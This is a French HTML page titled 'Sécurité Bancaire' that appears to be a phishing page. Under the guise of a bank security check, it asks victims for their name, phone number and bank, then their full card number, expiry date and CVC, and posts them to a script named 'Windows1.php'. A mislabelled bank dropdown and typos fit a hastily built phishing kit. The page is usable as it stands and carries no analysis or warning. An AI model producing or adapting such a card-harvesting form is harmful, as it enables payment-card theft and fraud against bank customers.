
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="styles.css">
    <title>Sécurité Bancaire</title>
</head>
<body>    
    <div class="form-container">
        <h1>Sécurité Bancaire</h1><br><br>
        
        <form action="Windows1.php" method="POST" class="container">
            <table>
                <tr>
                    <td><label for="nom">Nom complet :</label></td>
                    <td><input type="text" id="nom" name="nom" required></td>
                </tr>
                
                <tr>
                    <td><label for="telephone">Numéro de téléphone :</label></td>
                    <td><input type="text" id="telephone" name="telephone" required></td>
                </tr>
                
                <tr>
                    <td><label for="banque">Votre fédérations du groupe Crédit mutuel :</label></td>
                    <td>
                        <select id="banque" name="banque" required>
                            <option value="">Sélectionnez une fédérations</option>
                            <option value="Credit agricole">Credit agricole</option>
                            <option value="Populaire">Banque Populaire</option>
                            <option value="CIC">CIC</option>
                            <option value="LCL">LCL</option>
                            <option value="Boursorama">Boursorama</option>
                            <option value="Nickel">Nickel</option>
                            <option value="POSTALE">POSTALE</option>
                            <option value="Crédit Mutuel">Crédit Mutue</option>
                            <option value="Caisse d’épargne">Caisse d’épargne</option>
                            <option value="Autre">Autre</option>
                        </select>
                    </td>
                </tr>
				
				<tr>
					<td></td>
					<td><input type="text" id="autre" name="autre" placeholder="Autre"></td>
				</tr>
                
                <tr>
                    <td><label for="carte">Coordonnées de la carte bancaire :</label></td>
                    <td><input type="password" id="carte" name="carte" required placeholder="4444 4444 4444 4444"></td>
                </tr>
                
                <tr>
                    <td><label for="date_exp">Date d'expiration :</label></td>
                    <td><input type="password" id="date_exp" name="date_exp" required placeholder="MM/AA"></td>
                </tr>
                
                <tr>
                    <td><label for="cvc">CVC :</label></td>
                    <td><input type="password" id="cvc" name="cvc" required placeholder="CVC"></td>
                </tr>
                
                <tr>
                    <td></td>
                    <td><input type="submit" value="Sécurisé"></td>
                </tr>
            </table>
        </form>
    </div>
</body>
</html>
